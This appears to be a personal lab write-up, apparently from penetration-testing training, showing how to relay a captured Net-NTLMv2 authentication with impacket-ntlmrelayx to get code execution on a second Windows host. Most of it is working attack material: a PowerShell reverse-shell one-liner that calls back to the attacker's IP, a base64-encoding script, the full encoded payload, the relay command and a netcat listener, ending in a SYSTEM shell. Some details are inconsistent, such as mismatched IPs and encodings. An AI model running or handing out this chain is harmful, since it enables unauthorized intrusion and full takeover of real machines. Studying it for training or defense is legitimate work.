---
description: Example of extracting and passing an NTLMv2 hash
---

# Relaying Net-NTLMv2

## Example

### Background and Assumptions

The overall goal of this example will be to leverage unprivileged code execution access to a machine (`FILES01`) into code execution via SMB on a second target (`FILES02`). That execution will be converted to a full reverse shell.

#### Assumptions

* Attacker has access to `FILES01` (hosted at `192.168.241.211`)as an unprivileged user (`files02admin`)
  * Cannot run Mimikatz to extract passwords
  * Access is via a bind shell running on port `5555`
* Attacker attempted to use the steps illustrated in [Cracking NTLMv2](cracking-net-ntlmv2.md) and successfully obtained a hash of the password but was unable to crack it due to the password's complexity
* Attacker machine is `192.168.45.201`
* `FILES02` is hosted at `192.168.241.212`

### Setting Up the Attack

The overall structure of the attack will be:

1. Cause the machine `FILES01` to attempt authentication to an **SMB relay** that is under the attacker's control
   * Attacker will use the `dir` command to attempt to enumerate a "share" on the attacker's machine (actually the relay software)
2. The relay will handle the process of accepting an incoming authentication attempt, capturing the hash, and passing it to the target (`FILES02`) for authentication.
   * If _files02admin_ is a local user of FILES02, the authentication is valid and therefore accepted by the machine
   * If the relayed authentication is from a user (`files02admin` in the example) with local Administrator (member of the local Administrators group) privileges on the target (`FILES02`) , it can use it to authenticate and then execute commands over SMB with methods similar to those used by `psexec` or `wmiexec`

#### SMB Relay

The SMB relay software used in this attack will be the [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) script from the [impacket library](https://github.com/fortra/impacket/tree/master). This tool does the heavy lifting for of setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of the attacker's choice.

ntlmrelayx can also accept a command to be executed on the target machine. In this case, a PowerShell one-liner reverse shell will be used:

{% code title="rev_shell.ps1" overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.201',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

* Note the IP and port of the reverse shell listener inside the `TCPClient()` constructor.

This one-liner will be base64 encoded. To do so I wrote a PowerShell script to base64 encode (I messed around with `base64` on Linux but the output kept erroring on relay as an invalid command once decoded but using PowerShell created valid output):

{% code title="base64_enc.ps1" %}
```powershell
param([String]$text)

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$Encoded = [Convert]::ToBase64String($Bytes)
return $Encoded
```
{% endcode %}

This was then used by reading the file into a string variable then passing the variable as an argument to the script. All this was done to escape the problems caused by the presence of both quotation marks and apostrophes in the reverse shell:

{% code overflow="wrap" %}
```powershell
PS C:\Users\offsec> $revTxt = [IO.File]::ReadAllText("rev_shell.ps1")

PS C:\Users\offsec> .\base_enc.ps1 $revTxt | Out-File -Path .\rev.base64                                                                                      
```
{% endcode %}

The output was saved in the file below:

{% code title="rev.base64" overflow="wrap" %}
```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```
{% endcode %}

Thus, `ntlmrelayx` will be started with the following command:

{% code overflow="wrap" %}
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.241.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```
{% endcode %}

* `--smb2support` adds support for [SMB2](https://wiki.wireshark.org/SMB2)
* `--no-http-server` disables HTTP server because only SMB is needed in this case
* `-t` sets the target (FILES02) for the relay
* `-c` is the command that will be executed on the target as the relayed user
  * The command calls PowerShell (via `powershell`) and then passes it a base64 encoded command via the `-enc` parameter

This results in the output:

```shell-session
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.241.212 -c "powershell -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4yMDEnLDgwODApOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICIuIHsgJGRhdGEgfSAyPiYxIiB8IE91dC1TdHJpbmcgKTsgJHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK"
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

At this point the relay software is listening for any incoming connections and the attacker must now induce a connection from the attacker-accessible `FILES01`.

#### Reverse Shell Listener

As noted in the [background](relaying-net-ntlmv2.md#background-and-assumptions) section the ultimate goal is to create a reverse shell on the target (`FILES02`). This will be created via netcat on port `8080`:

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
```

### Capturing and Relaying the Hash

From here the attacker will access their bind shell (port `5555`) and use the dir command to enumerate a fake share that is the relay software (on `192.168.45.201`):

```shell-session
kali@kali:~$ rlwrap nc 192.168.245.211 5555
```

&#x20;This causes the relay software to show the authentication event (shell session output continued from above):

{% code lineNumbers="true" %}
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.241.211, attacking target smb://192.168.241.212
[*] Authenticating against smb://192.168.241.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] Starting service RemoteRegistry
[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.241.211 controlled, but there are no more targets left!
who[*] Executed specified command on host: 192.168.241.212
[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
[*] Stopping service RemoteRegistry
```
{% endcode %}

As shown by the output on line 14, the command was successfully executed. The relay prompts the target (FILES02) to reach out to the reverse shell listener which catches it:

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.241.212] 63344
whoami
nt authority\system
PS C:\Windows\system32> hostname
FILES02
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::493e:61a:5376:c270%4
   IPv4 Address. . . . . . . . . . . : 192.168.241.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.241.254
PS C:\Windows\system32> exit
```

Thus enabling code execution on the target!
